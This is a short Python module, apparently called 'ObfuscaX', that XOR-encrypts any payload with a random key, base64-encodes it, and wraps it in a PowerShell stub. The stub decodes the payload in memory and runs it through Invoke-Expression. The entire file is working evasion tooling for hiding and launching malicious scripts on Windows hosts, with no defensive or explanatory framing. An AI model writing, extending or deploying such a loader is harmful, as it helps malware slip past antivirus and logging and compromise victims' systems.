import base64
import logging
import random

logger = logging.getLogger("ObfuscaX")


def xor_encrypt(data, key):
    return bytes(b ^ key for b in data)


def dynamic_obfuscate(payload, xor_key=None):
    logger.info("Starting dynamic obfuscation...")

    if isinstance(payload, str):
        payload = payload.encode()

    if xor_key is None:
        xor_key = random.randint(1, 255)
    elif not 1 <= xor_key <= 255:
        raise ValueError("xor key must be between 1 and 255")
    logger.debug(f"Using XOR key: {xor_key}")

    encrypted = xor_encrypt(payload, xor_key)
    b64_encrypted = base64.b64encode(encrypted).decode()

    # PowerShell stub to decode and run in memory.
    ps_template = f'''
$encoded = "{b64_encrypted}"
$key = {xor_key}
$bytes = [Convert]::FromBase64String($encoded)
for ($i=0; $i -lt $bytes.Length; $i++) {{
    $bytes[$i] = $bytes[$i] -bxor $key
}}
$decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
Invoke-Expression $decoded
'''

    logger.info("Dynamic obfuscation complete.")
    return ps_template.encode()
